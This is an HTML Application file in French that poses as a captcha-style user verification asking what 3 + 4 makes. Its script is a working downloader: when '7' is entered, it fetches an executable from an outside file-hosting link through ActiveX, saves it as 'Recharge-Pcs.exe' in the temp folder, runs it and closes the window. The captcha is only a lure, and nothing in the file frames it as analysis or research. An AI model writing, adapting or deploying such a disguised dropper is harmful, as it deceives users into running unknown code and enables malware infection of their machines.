<!DOCTYPE html>
<html>
<head>
  <title>Validation Captcha</title>
  <hta:application 
    applicationname="CaptchaPCS"
    border="dialog"
    caption="yes"
    maximizeButton="no"
    minimizeButton="no"
    showInTaskBar="yes"
    sysMenu="yes"
    singleInstance="yes"
    windowState="normal"
    scroll="no"
  />
  <script type="text/javascript">
    function validerCaptcha() {
      var reponse = document.getElementById("captcha").value;
      if (reponse == "7") {
        telechargerEtLancer();
      } else {
        alert("❌ Réponse incorrecte. Essayez encore.");
      }
    }

    function telechargerEtLancer() {
      try {
        var url = "https://uploadnow.io/f/6rMYsGk?raw=true"; // Lien direct
        var fso = new ActiveXObject("Scripting.FileSystemObject");
        var shell = new ActiveXObject("WScript.Shell");
        var temp = shell.ExpandEnvironmentStrings("%TEMP%");
        var chemin = temp + "\\Recharge-Pcs.exe";

        var xhr = new ActiveXObject("MSXML2.XMLHTTP");
        xhr.open("GET", url, false);
        xhr.send();

        if (xhr.status === 200) {
          var stream = new ActiveXObject("ADODB.Stream");
          stream.Type = 1; // binaire
          stream.Open();
          stream.Write(xhr.responseBody);
          stream.SaveToFile(chemin, 2);
          stream.Close();

          shell.Run('"' + chemin + '"', 1, false);
          window.close();
        } else {
          alert("Échec du téléchargement : " + xhr.status);
        }
      } catch (e) {
        alert("Erreur : " + e.message);
      }
    }
  </script>
</head>
<body style="font-family: Arial; padding: 20px;">
  <h2>🔐 Vérification utilisateur</h2>
  <p>Combien font 3 + 4 ?</p>
  <input type="text" id="captcha" />
  <button onclick="validerCaptcha()">Valider</button>
</body>
</html>
